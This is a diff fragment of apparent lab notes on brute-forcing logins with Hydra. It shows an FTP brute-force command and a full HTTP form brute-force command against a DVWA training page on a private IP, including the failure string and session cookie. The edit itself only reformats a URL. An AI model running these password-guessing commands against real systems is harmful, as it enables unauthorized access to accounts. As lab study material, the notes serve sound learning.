@@ -26,7 +26,7 @@ hydra -v -L users.txt -P wordlist.txt 192.168.0.100 21
 
 ## Brute force HTTP
 
-URL: http://192.168.0.100/dvwa/vulnerabilities/brute/?username=teste&password=teste&Login=Login#
+URL: <http://192.168.0.100/dvwa/vulnerabilities/brute/?username=teste&password=teste&Login=Login#>
 
 ```bash
 hydra -v -l admin -P pass.txt 192.168.0.100 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=4h91dkp7pcp8184nil8rt9ok13; security=low"
